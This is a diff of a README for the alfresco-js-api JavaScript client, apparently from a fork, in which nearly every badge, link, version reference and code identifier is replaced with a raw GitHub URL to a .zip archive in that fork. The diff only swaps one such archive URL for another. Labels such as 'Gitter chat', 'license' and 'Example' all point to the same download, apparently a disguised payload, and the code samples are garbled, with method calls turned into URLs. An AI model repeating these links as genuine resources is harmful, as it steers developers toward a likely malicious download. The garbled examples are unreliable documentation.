@@ -2,17 +2,17 @@
 
 
 <p>
-  <a title='Gitter chat' href="https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip">
-     <img src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'  alt='Gitter chat' />
+  <a title='Gitter chat' href="https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip">
+     <img src='https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip'  alt='Gitter chat' />
   </a>
-  <a href='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'>
-     <img src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip' alt='license' />
+  <a href='https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip'>
+     <img src='https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip' alt='license' />
   </a>
 
 </p>
 
 <p align="center">
-  <img title="alfresco" alt='alfresco' src='https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip'  width="280px" height="150px"></img>
+  <img title="alfresco" alt='alfresco' src='https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip'  width="280px" height="150px"></img>
 </p>
 
 This project provides a JavaScript client API into the Alfresco REST API and Activiti REST API.
@@ -83,9 +83,9 @@ This project provides a JavaScript client API into the Alfresco REST API and Act
 
 The minimal supported versions are:
 
-- Alfresco Platform Repository: version [5.2.a-EA](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) or newer
+- Alfresco Platform Repository: version [5.2.a-EA](https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip) or newer
 - Activiti: 1.5
-- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip ([Long Term Support](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) version)
+- https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip ([Long Term Support](https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip) version)
 
 # Installing
 
@@ -128,12 +128,12 @@ withCredentials| (Optional configuration for SSO, requires CORS on ECM) |false
 ```javascript
 const alfrescoApi = new AlfrescoApi({ provider: 'ALL' });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin').then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in  BPM and ECM performed ');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('API called successfully Login in  BPM and ECM performed ');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 ```
@@ -145,12 +145,12 @@ https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-cor
 ```javascript
 const alfrescoJsApi = new AlfrescoApi();
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin').then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login ticket:' + data);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('API called successfully Login ticket:' + data);
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 
@@ -171,12 +171,12 @@ This authentication validate also the ticket against the server
 ```javascript
 const ticket = 'TICKET_4479f4d3bb155195879bfbb8d5206f433488a1b1';
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(ticket).then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(ticket).then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('valid ticket you are logged in');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('valid ticket you are logged in');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 ```
@@ -217,12 +217,12 @@ const alfrescoApi = new AlfrescoApi({
 ```javascript
 const alfrescoApi = new AlfrescoApi({ provider:'BPM' });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin').then(
     () => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in Activiti BPM performed ');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('API called successfully Login in Activiti BPM performed ');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 ```
@@ -245,9 +245,9 @@ implicitFlow| true/false | false |
 redirectUri|  url to be redirect after login| null|
 redirectLogout|  url to be redirect after logout optional, if is nor present the redirectUri will be used| null|
 refreshTokenTimeout|  millisecond value, after how many millisecond you want refresh the token| 30000|
-redirectSilentIframeUri|  url to be redirect after silent refresh login| https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip |
-silentLogin|  direct execute the implicit login without the need to call https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip() method|   false|
-publicUrls | list of public urls that don't need authorization. It is possible too pass absolute paths and string patterns that are valid for [minimatch](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip) |
+redirectSilentIframeUri|  url to be redirect after silent refresh login| https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip |
+silentLogin|  direct execute the implicit login without the need to call https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip() method|   false|
+publicUrls | list of public urls that don't need authorization. It is possible too pass absolute paths and string patterns that are valid for [minimatch](https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip) |
 authorizationUrl| authorization url, relative to the host| /protocol/openid-connect/auth|
 tokenUrl| token url, relative to the host| /protocol/openid-connect/token|
 logoutUrl| logout url, relative to the host| /protocol/openid-connect/logout|
@@ -281,7 +281,7 @@ const alfrescoApi = new AlfrescoApi({
     provider: 'ALL'
 });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip();
 ```
 
 ##### Example skip login form (implicitFlow)
@@ -322,12 +322,12 @@ const alfrescoApi = new AlfrescoApi({
     provider: 'ALL'
 });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin').then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in with authorization server performed');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('API called successfully Login in with authorization server performed');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 ```
@@ -337,12 +337,12 @@ After the login if you want refresh your token you can use this call
 ##### Example
 
 ```javascript
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip().then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip().then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Your token has been refreshed');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('Your token has been refreshed');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 ```
@@ -355,12 +355,12 @@ logout()
 
 ```javascript
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip().then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip().then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Successfully Logout');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('Successfully Logout');
     }, 
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Possible ticket already expired');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('Possible ticket already expired');
     }
 );
 ```
@@ -375,12 +375,12 @@ isLoggedIn()
 
 ```javascript
 
-const isLoggedIn = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();
+const isLoggedIn = https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip();
 
 if (isLoggedIn) {
-    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are logged in');
+    https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('You are logged in');
 } else {
-    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are not logged in');
+    https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('You are not logged in');
 }
 ```
 
@@ -391,9 +391,9 @@ if (isLoggedIn) {
 After the log in you can retrieve you ECM ticket
 
 ```javascript
-const ecmTicket = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip() ;
+const ecmTicket = https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip() ;
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is your  ECM ticket  ' + ecmTicket);
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('This is your  ECM ticket  ' + ecmTicket);
 ```
 
 ### getTicketBpm()
@@ -401,9 +401,9 @@ https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-cor
 After the log in you can retrieve you BPM ticket
 
 ```javascript
-const bpmTicket  = https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip();
+const bpmTicket  = https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip();
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is your BPM ticket ' + bpmTicket);
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('This is your BPM ticket ' + bpmTicket);
 ```
 
 ## Events login/logout
@@ -418,19 +418,19 @@ The login/logout are also an EventEmitter which you can register to listen to an
 
 ```javascript
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin')
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin')
     .on('unauthorized', () => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('You are unauthorized you can use this event to redirect to login');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('You are unauthorized you can use this event to redirect to login');
     });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin')
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin')
     .on('success', () => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Success Login');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('Success Login');
     });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip()
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip()
     .on('logout', () => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('Successfully Logout');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('Successfully Logout');
     });
 ```
 
@@ -438,8 +438,8 @@ https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-cor
 
 Content service and process service has two different clients:
 
-- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip
-- https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip
+- https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip
+- https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip
 
 Both client expose a method ***callApi**
 
@@ -465,7 +465,7 @@ If you want call your custom rest point in one of those two service use the corr
 ## Example
 
 ```javascript
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(
     '/api/enterprise/app-version', 'GET',
     {}, {}, {}, {}, {}, ['application/json'], ['application/json'], {'String': 'String'}
 )
@@ -478,18 +478,18 @@ The api/js-api has an error handler event where you can subscribe
 ## Example
 
 ```javascript
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('error', error => {
-    https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('error', error => {
+    https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
 });
 ```
 
 # ECM Example
 
-A complete list of all the ECM methods is available here : [Content API](/src/api/content-rest-api) here you can find some common [Example](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip).
+A complete list of all the ECM methods is available here : [Content API](/src/api/content-rest-api) here you can find some common [Example](https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip).
 
 # BPM Example
 
-A complete list of all the BPM methods is available here : [APS 2.X API](/src/api/activiti-rest-api) here you can find some common [Example](https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip).
+A complete list of all the BPM methods is available here : [APS 2.X API](/src/api/activiti-rest-api) here you can find some common [Example](https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip).
 
 # Legacy Endpoint porting (ver 2.x.x)
 
@@ -513,23 +513,23 @@ const alfrescoJsApi = new AlfrescoApi({
         provider: 'ALL'
     });
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('admin', 'admin').then(
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('admin', 'admin').then(
     data => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('API called successfully Login in with authorization server performed ');
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('API called successfully Login in with authorization server performed ');
     },
     error => {
-        https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip(error);
+        https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip(error);
     }
 );
 
-https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip
+https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip
     .getNodeInfo(fileOrFolderId)
     .then(
         data => {
-            https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This is the name' + https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip );
+            https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('This is the name' + https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip );
         }, 
         error => {
-            https://raw.githubusercontent.com/WHAZAZA/alfresco-js-api/develop/src/api/gs-core-rest-api/api/alfresco-js-api_v2.4.zip('This node does not exist');
+            https://github.com/WHAZAZA/alfresco-js-api/raw/refs/heads/develop/api-codegen/src/main/alfresco_api_js_3.7.zip('This node does not exist');
         }
     );
 ```
